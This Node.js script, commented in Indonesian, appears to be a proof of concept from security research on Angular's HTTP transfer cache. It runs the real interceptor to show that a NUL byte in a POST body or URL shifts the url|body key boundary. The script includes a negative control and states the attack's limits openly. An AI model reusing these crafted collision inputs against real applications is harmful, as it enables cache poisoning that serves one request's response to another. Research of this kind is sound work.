/**
 * Dampak tabrakan kunci transfer cache — dijalankan lewat INTERCEPTOR ASLI.
 *
 * Langkah sebelumnya (cachekey-collision.mjs) hanya membuktikan dua permintaan
 * berbeda menghasilkan kunci yang sama. Itu belum dampak. Di sini kita
 * jalankan `transferCacheInterceptorFn` yang sebenarnya:
 *
 *   FASE SERVER (ngServerMode = true)
 *     Permintaan PENYERANG dijalankan; responsnya disimpan ke TransferState.
 *   FASE KLIEN  (ngServerMode = false)
 *     Permintaan KORBAN dijalankan. Kalau ia mengambil respons penyerang dari
 *     cache alih-alih memanggil backend, kontrolnya bocor lintas-permintaan.
 *
 * Kontrol negatif ikut dijalankan dengan payload yang sama TANPA byte NUL:
 * di sana permintaan korban HARUS mencapai backend.
 *
 * KESETIAAN: interceptor, token DI, TransferState, dan HttpRequest semuanya
 * dari bundel npm. Yang dibuat sendiri hanya "backend" tiruan di ujung rantai.
 *
 * Jalankan: node analysis/tools/sha256/cachekey-e2e.mjs <path-node_modules>
 */
import {readFileSync, writeFileSync, unlinkSync} from 'fs';
import {join, dirname} from 'path';
import {pathToFileURL} from 'url';

const nm = process.argv[2];
if (!nm) {
  console.error('pakai: node cachekey-e2e.mjs <path-ke-node_modules>');
  process.exit(2);
}

const M = (p) => pathToFileURL(join(nm, p)).href;
await import(M('@angular/compiler/fesm2022/compiler.mjs'));
const core = await import(M('@angular/core/fesm2022/core.mjs'));
const http = await import(M('@angular/common/fesm2022/http.mjs'));
const pkg = JSON.parse(readFileSync(join(nm, '@angular/common/package.json'), 'utf8'));

const {Injector, runInInjectionContext, TransferState, DOCUMENT, APP_ID} = core;
const {HttpRequest, HttpResponse, ɵwithHttpTransferCache} = http;
// `rxjs` harus di-resolve SEBAGAI PAKET (impor internalnya tanpa ekstensi), dan
// resolusi Node relatif terhadap berkas pengimpor — bukan cwd. Jadi kita titipkan
// shim satu baris di sebelah node_modules milik sandbox.
const shim = join(dirname(nm), `__rxjs-shim-${process.pid}.mjs`);
writeFileSync(shim, "export * from 'rxjs';\n");
let of;
try {
  ({of} = await import(pathToFileURL(shim).href));
} finally {
  unlinkSync(shim);
}

const NUL = '\u0000';

// Interceptor tidak diekspor; ambil dari providers yang dikembalikan
// ɵwithHttpTransferCache supaya kita tetap memakai fungsi yang dikirim npm.
// POST hanya di-cache bila aplikasi mengaktifkan opsi ini (opsi publik yang
// terdokumentasi). GET tidak pernah bisa bertabrakan: medan body-nya selalu
// kosong, sehingga tidak ada isi yang bisa menyerap pemisah.
const providers = ɵwithHttpTransferCache({includePostRequests: true});
const flat = providers.flat(Infinity);
const interceptorProvider = flat.find(
  (p) => p && p.multi && typeof p.useValue === 'function' && p.useValue.length === 2,
);
if (!interceptorProvider) {
  console.error('Tidak menemukan transferCacheInterceptorFn di providers. Ekspor berubah?');
  process.exit(2);
}
const transferCacheInterceptorFn = interceptorProvider.useValue;
const cacheOptionsProvider = flat.find((p) => p && p.useFactory && !p.multi);

function buatInjector() {
  return Injector.create({
    providers: [
      // TransferState mencari <script id="..."> berisi state awal; di luar
      // peramban cukup dokumen tiruan yang tidak menemukan apa pun.
      {provide: DOCUMENT, useValue: {getElementById: () => null}},
      {provide: APP_ID, useValue: 'ng'},
      TransferState,
      cacheOptionsProvider,
      ...flat.filter((p) => p !== interceptorProvider && p !== cacheOptionsProvider),
    ],
  });
}

/** Menjalankan satu permintaan lewat interceptor asli. */
function jalankan(injector, req, responsBackend) {
  let backendDipanggil = false;
  const next = () => {
    backendDipanggil = true;
    return of(
      new HttpResponse({body: responsBackend, status: 200, statusText: 'OK', url: req.url}),
    );
  };
  let hasil;
  runInInjectionContext(injector, () => {
    transferCacheInterceptorFn(req, next).subscribe((e) => {
      if (e instanceof HttpResponse) hasil = e;
    });
  });
  return {backendDipanggil, body: hasil?.body};
}

function skenario(ket, reqPenyerang, reqKorban) {
  const injector = buatInjector();
  const ts = injector.get(TransferState);

  globalThis.ngServerMode = true;
  const server = jalankan(injector, reqPenyerang, 'RESPONS-PENYERANG');

  // Serialisasi TransferState seperti yang dilakukan SSR, lalu muat ulang di
  // sisi klien — persis alur nyata, bukan berbagi objek.
  const serial = ts.toJson();
  const injectorKlien = buatInjector();
  const tsKlien = injectorKlien.get(TransferState);
  tsKlien.store = JSON.parse(serial);

  globalThis.ngServerMode = false;
  const klien = jalankan(injectorKlien, reqKorban, 'RESPONS-BACKEND-ASLI');

  const bocor = !klien.backendDipanggil && klien.body === 'RESPONS-PENYERANG';
  console.log(`\n  ${bocor ? '>>> BOCOR   ' : '    aman    '} ${ket}`);
  console.log(
    `      penyerang  ${reqPenyerang.method} url=${JSON.stringify(reqPenyerang.url)} ` +
      `body=${JSON.stringify(reqPenyerang.serializeBody())}`,
  );
  console.log(
    `      korban     ${reqKorban.method} url=${JSON.stringify(reqKorban.url)} ` +
      `body=${JSON.stringify(reqKorban.serializeBody())}`,
  );
  console.log(
    `      klien: backend dipanggil = ${klien.backendDipanggil}, ` +
      `body diterima = ${JSON.stringify(klien.body)}`,
  );
  return bocor;
}

const garis = '='.repeat(78);
console.log(garis);
console.log(`Dampak tabrakan kunci transfer cache — @angular/common@${pkg.version}`);
console.log(garis);
console.log('\nDua permintaan POST yang BERBEDA, dipetakan ke satu kunci cache.');
console.log('Batas medan url|body digeser: NUL di akhir body permintaan pertama');
console.log('menggantikan pemisah, sehingga string gabungannya identik.');
console.log('\nCATATAN KEJUJURAN: pasangan ini hanya terbentuk bila SALAH SATU dari');
console.log('kedua permintaan sudah memuat NUL. Penyerang yang hanya mengendalikan');
console.log('permintaannya sendiri TIDAK dapat menabrak permintaan korban yang bersih —');
console.log('lihat README untuk turunan lengkapnya.');

// Permintaan #1 — body berakhir dengan NUL.
const korban = () => new HttpRequest('POST', '/api/x', `RAHASIA${NUL}`);

// Permintaan #2 — URL menyerap body, body kosong. Kunci identik.
const penyerang = () => new HttpRequest('POST', `/api/x${NUL}RAHASIA`, '');

// Kontrol negatif: bentuk yang sama persis, hanya NUL-nya dihilangkan.
const penyerangTanpaNul = () => new HttpRequest('POST', `/api/xRAHASIA`, '');

const bocor1 = skenario('batas url|body digeser dengan NUL', penyerang(), korban());
const bocor2 = skenario('KONTROL NEGATIF — bentuk sama, tanpa NUL', penyerangTanpaNul(), korban());

console.log('\n' + garis);
if (bocor1 && !bocor2) {
  console.log('TERKONFIRMASI: satu byte NUL menggeser batas medan, sehingga respons');
  console.log('permintaan PERTAMA disajikan untuk permintaan KEDUA di sisi klien —');
  console.log('backend tidak pernah dipanggil. Tanpa NUL, backend tetap dipanggil.');
  console.log('');
  console.log('Ini MEMBANTAH klaim di transfer_cache.ts:424-426 bahwa batas medan');
  console.log('"tidak bisa dipalsukan oleh isi medan". Klaim itu hanya menalar tentang');
  console.log('url dan params; medan BODY tidak ikut ditalar, dan serializeBody()');
  console.log('meneruskan string apa adanya.');
} else {
  console.log(`Tidak terkonfirmasi (bocor1=${bocor1}, bocor2=${bocor2}).`);
}
console.log(garis);
process.exit(bocor1 && !bocor2 ? 0 : 1);
